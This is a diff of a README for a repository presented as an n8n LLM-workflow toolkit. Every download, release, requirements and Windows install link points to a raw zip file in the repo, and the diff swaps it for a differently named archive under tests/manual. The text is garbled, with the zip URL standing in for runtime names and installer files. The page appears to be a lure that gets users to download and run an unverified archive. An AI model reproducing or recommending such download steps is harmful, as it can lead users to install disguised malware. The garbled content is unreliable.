@@ -1,6 +1,6 @@
 # 🚀 n8n-llm-workflows - Effortlessly Manage Your LLM Workflows
 
-[![Download n8n-llm-workflows](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip)](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip)
+[![Download n8n-llm-workflows](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip)](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip)
 
 ## 📖 Overview
 
@@ -12,20 +12,20 @@ n8n-llm-workflows is a TypeScript toolkit designed to help you manage, test, and
 - **Example Automations**: Start quickly with ready-to-use automation templates.
 - **Typed API Client**: Use a clear API to interact with n8n.
 - **Scalable Workflows**: Design workflows that can grow with your needs.
-- **Compatibility**: Works seamlessly with https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip and Docker.
+- **Compatibility**: Works seamlessly with https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip and Docker.
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download n8n-llm-workflows, go to our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip).
+1. **Visit the Releases Page**: To download n8n-llm-workflows, go to our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip).
 
-2. **Select Your Version**: On the Releases page, choose the latest version for download. You'll typically see files with names like `https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip` or similar.
+2. **Select Your Version**: On the Releases page, choose the latest version for download. You'll typically see files with names like `https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip` or similar.
 
 3. **Download the Package**: Click the link for the appropriate file type for your operating system to download it.
 
 ## 🛠️ System Requirements
 
 - **Operating System**: Windows, macOS, or Linux.
-- **https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip**: Version 14.x or later.
+- **https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip**: Version 14.x or later.
 - **Disk Space**: At least 100 MB of free space.
 - **Internet Access**: Required for updates and online features.
 
@@ -33,12 +33,12 @@ n8n-llm-workflows is a TypeScript toolkit designed to help you manage, test, and
 
 Once you have selected your version:
 
-1. **Click the Download Link**: Go to our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip) and choose the file to download.
+1. **Click the Download Link**: Go to our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip) and choose the file to download.
 
 2. **Extract the Files**: If you downloaded a `.zip` file, right-click it and select "Extract All" to get to the application files.
 
 3. **Installation Instructions**:
-   - **Windows**: Double-click `https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip` to install.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip` to install.
    - **macOS**: Drag the application into your Applications folder.
    - **Linux**: Open a terminal, navigate to the downloaded folder, and run `./n8n-llm-workflows`.
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 💡 Summary
 
-Whether you want to look at automations for OpenAI, generative AI projects, or just enhance your n8n experiences, n8n-llm-workflows provides the tools you need. Download from our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/scripts/n8n-llm-workflows-v2.8.zip) and begin your journey towards efficient workflow management.
+Whether you want to look at automations for OpenAI, generative AI projects, or just enhance your n8n experiences, n8n-llm-workflows provides the tools you need. Download from our [Releases page](https://raw.githubusercontent.com/slayerlux/n8n-llm-workflows/main/tests/manual/llm-workflows-n-1.4.zip) and begin your journey towards efficient workflow management.
